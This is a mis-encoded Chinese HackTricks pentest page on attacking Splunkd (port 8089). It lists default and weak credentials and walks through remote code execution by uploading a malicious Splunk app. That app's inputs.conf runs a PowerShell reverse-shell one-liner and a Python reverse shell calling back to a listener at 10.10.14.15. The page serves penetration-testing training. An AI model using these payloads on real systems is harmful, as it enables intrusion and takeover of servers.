# 8089 - Splunkdæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **åŸºæœ¬ä¿¡æ¯**

**Splunk**æ˜¯ä¸€ä¸ªç”¨äºæ”¶é›†ã€åˆ†æå’Œå¯è§†åŒ–æ•°æ®çš„**æ—¥å¿—åˆ†æå·¥å…·**ã€‚å°½ç®¡æœ€åˆå¹¶ä¸æ˜¯ä½œä¸ºSIEMå·¥å…·è€Œè®¾è®¡çš„ï¼Œä½†Splunkç»å¸¸ç”¨äº**å®‰å…¨ç›‘æ§å’Œä¸šåŠ¡åˆ†æ**ã€‚Splunkéƒ¨ç½²é€šå¸¸ç”¨äºå­˜å‚¨**æ•æ„Ÿæ•°æ®**ï¼Œå¦‚æœè¢«æ”»å‡»è€…å…¥ä¾µï¼Œå¯èƒ½ä¼šæä¾›å¤§é‡ä¿¡æ¯ã€‚

**é»˜è®¤ç«¯å£ï¼š**8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
Splunk WebæœåŠ¡å™¨é»˜è®¤åœ¨ç«¯å£8000ä¸Šè¿è¡Œã€‚
{% endhint %}

## æšä¸¾

### å…è´¹ç‰ˆæœ¬

Splunk Enterpriseè¯•ç”¨ç‰ˆåœ¨60å¤©åè½¬æ¢ä¸º**å…è´¹ç‰ˆæœ¬**ï¼Œ**ä¸éœ€è¦èº«ä»½éªŒè¯**ã€‚ç³»ç»Ÿç®¡ç†å‘˜å®‰è£…Splunkè¯•ç”¨ç‰ˆè¿›è¡Œæµ‹è¯•ï¼Œç„¶å**å¾€å¾€ä¼šå¿˜è®°**ã€‚è¿™å°†è‡ªåŠ¨è½¬æ¢ä¸ºæ²¡æœ‰ä»»ä½•å½¢å¼èº«ä»½éªŒè¯çš„å…è´¹ç‰ˆæœ¬ï¼Œä»è€Œåœ¨ç¯å¢ƒä¸­å¼•å…¥å®‰å…¨æ¼æ´ã€‚ä¸€äº›ç»„ç»‡å¯èƒ½ç”±äºé¢„ç®—é™åˆ¶è€Œé€‰æ‹©å…è´¹ç‰ˆæœ¬ï¼Œä½†å¹¶ä¸å®Œå…¨äº†è§£æ²¡æœ‰ç”¨æˆ·/è§’è‰²ç®¡ç†çš„å½±å“ã€‚

### é»˜è®¤å‡­æ®

åœ¨æ—§ç‰ˆæœ¬çš„Splunkä¸­ï¼Œé»˜è®¤å‡­æ®æ˜¯**`admin:changeme`**ï¼Œæ–¹ä¾¿åœ°æ˜¾ç¤ºåœ¨ç™»å½•é¡µé¢ä¸Šã€‚\
ç„¶è€Œï¼Œ**æœ€æ–°ç‰ˆæœ¬çš„Splunk**åœ¨**å®‰è£…è¿‡ç¨‹ä¸­è®¾ç½®å‡­æ®**ã€‚å¦‚æœé»˜è®¤å‡­æ®ä¸èµ·ä½œç”¨ï¼Œå¯ä»¥å°è¯•å¸¸è§çš„å¼±å¯†ç ï¼Œå¦‚`admin`ï¼Œ`Welcome`ï¼Œ`Welcome1`ï¼Œ`Password123`ç­‰ã€‚

### è·å–ä¿¡æ¯

ç™»å½•Splunkåï¼Œæˆ‘ä»¬å¯ä»¥**æµè§ˆæ•°æ®**ï¼Œè¿è¡Œ**æŠ¥å‘Š**ï¼Œåˆ›å»º**ä»ªè¡¨æ¿**ï¼Œä»Splunkbaseåº“ä¸­**å®‰è£…åº”ç”¨ç¨‹åº**ï¼Œå¹¶å®‰è£…è‡ªå®šä¹‰åº”ç”¨ç¨‹åºã€‚\
æ‚¨è¿˜å¯ä»¥è¿è¡Œä»£ç ï¼šSplunkæœ‰å¤šç§è¿è¡Œä»£ç çš„æ–¹å¼ï¼Œä¾‹å¦‚æœåŠ¡å™¨ç«¯Djangoåº”ç”¨ç¨‹åºã€RESTç«¯ç‚¹ã€è„šæœ¬è¾“å…¥å’Œè­¦æŠ¥è„šæœ¬ã€‚åœ¨SplunkæœåŠ¡å™¨ä¸Šè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨è„šæœ¬è¾“å…¥ã€‚

æ­¤å¤–ï¼Œç”±äºSplunkå¯ä»¥å®‰è£…åœ¨Windowsæˆ–Linuxä¸»æœºä¸Šï¼Œå¯ä»¥åˆ›å»ºè„šæœ¬è¾“å…¥æ¥è¿è¡ŒBashã€PowerShellæˆ–æ‰¹å¤„ç†è„šæœ¬ã€‚

### Shodan

* `Splunkæ„å»º`

## RCE

### åˆ›å»ºè‡ªå®šä¹‰åº”ç”¨ç¨‹åº

è‡ªå®šä¹‰åº”ç”¨ç¨‹åºå¯ä»¥è¿è¡Œ**Pythonã€æ‰¹å¤„ç†ã€Bashæˆ–PowerShellè„šæœ¬**ã€‚\
è¯·æ³¨æ„ï¼Œ**Splunkå·²å®‰è£…äº†Python**ï¼Œå› æ­¤å³ä½¿åœ¨**Windows**ç³»ç»Ÿä¸­ï¼Œæ‚¨ä¹Ÿå¯ä»¥è¿è¡ŒPythonä»£ç ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨[**æ­¤**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunkè½¯ä»¶åŒ…æ¥å¸®åŠ©æˆ‘ä»¬ã€‚æ­¤å­˜å‚¨åº“ä¸­çš„**`bin`**ç›®å½•æœ‰[Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py)å’Œ[PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1)çš„ç¤ºä¾‹ã€‚è®©æˆ‘ä»¬é€æ­¥è¿›è¡Œã€‚

ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ä½¿ç”¨ä»¥ä¸‹ç›®å½•ç»“æ„åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„Splunkåº”ç”¨ç¨‹åºï¼š
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`**ç›®å½•å°†åŒ…å«æˆ‘ä»¬æ‰“ç®—è¿è¡Œçš„**è„šæœ¬**ï¼ˆåœ¨æœ¬ä¾‹ä¸­æ˜¯ä¸€ä¸ª**PowerShell**åå‘shellï¼‰ï¼Œé»˜è®¤ç›®å½•å°†æœ‰æˆ‘ä»¬çš„`inputs.conf`æ–‡ä»¶ã€‚æˆ‘ä»¬çš„åå‘shellå°†æ˜¯ä¸€ä¸ª**PowerShellä¸€è¡Œå‘½ä»¤ï¼š**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
[inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf)æ–‡ä»¶å‘Šè¯‰Splunkè¦è¿è¡Œå“ªä¸ªè„šæœ¬ä»¥åŠå…¶ä»–æ¡ä»¶ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†åº”ç”¨ç¨‹åºè®¾ç½®ä¸ºå¯ç”¨ï¼Œå¹¶å‘Šè¯‰Splunkæ¯10ç§’è¿è¡Œä¸€æ¬¡è„šæœ¬ã€‚é—´éš”å§‹ç»ˆä»¥ç§’ä¸ºå•ä½ï¼Œå¹¶ä¸”åªæœ‰åœ¨å­˜åœ¨æ­¤è®¾ç½®æ—¶ï¼Œè¾“å…¥ï¼ˆè„šæœ¬ï¼‰æ‰ä¼šè¿è¡Œã€‚
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
æˆ‘ä»¬éœ€è¦ä¸€ä¸ª`.bat`æ–‡ä»¶ï¼Œåœ¨åº”ç”¨éƒ¨ç½²æ—¶è¿è¡Œå¹¶æ‰§è¡ŒPowerShellä¸€è¡Œå‘½ä»¤ã€‚

ä¸‹ä¸€æ­¥æ˜¯é€‰æ‹©`ä»æ–‡ä»¶å®‰è£…åº”ç”¨`å¹¶ä¸Šä¼ åº”ç”¨ã€‚

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

åœ¨ä¸Šä¼ æ¶æ„è‡ªå®šä¹‰åº”ç”¨ä¹‹å‰ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨Netcatæˆ–[socat](https://linux.die.net/man/1/socat)å¯åŠ¨ä¸€ä¸ªç›‘å¬å™¨ã€‚
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
åœ¨`ä¸Šä¼ åº”ç”¨ç¨‹åº`é¡µé¢ä¸Šï¼Œç‚¹å‡»`æµè§ˆ`ï¼Œé€‰æ‹©ä¹‹å‰åˆ›å»ºçš„tarballæ–‡ä»¶ï¼Œç„¶åç‚¹å‡»`ä¸Šä¼ `ã€‚ä¸€æ—¦æˆ‘ä»¬ä¸Šä¼ åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºçš„çŠ¶æ€å°†è‡ªåŠ¨åˆ‡æ¢ä¸º`å·²å¯ç”¨`ï¼ŒåŒæ—¶æˆ‘ä»¬å°†æ”¶åˆ°ä¸€ä¸ªåå‘shellè¿æ¥ã€‚

#### Linux

å¦‚æœæˆ‘ä»¬å¤„ç†çš„æ˜¯ä¸€ä¸ªLinuxä¸»æœºï¼Œæˆ‘ä»¬éœ€è¦åœ¨åˆ›å»ºtarballæ–‡ä»¶å’Œä¸Šä¼ è‡ªå®šä¹‰æ¶æ„åº”ç”¨ç¨‹åºä¹‹å‰ç¼–è¾‘`rev.py` Pythonè„šæœ¬ã€‚å…¶ä½™çš„è¿‡ç¨‹å°†ä¿æŒä¸å˜ï¼Œæˆ‘ä»¬å°†åœ¨Netcatç›‘å¬å™¨ä¸Šè·å¾—ä¸€ä¸ªåå‘shellè¿æ¥ã€‚
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & ææƒ

åœ¨ä¸‹é¢çš„é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å¦‚ä½•æ»¥ç”¨æ­¤æœåŠ¡ä»¥æå‡æƒé™å¹¶è·å–æŒä¹…æ€§çš„è§£é‡Šï¼š

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
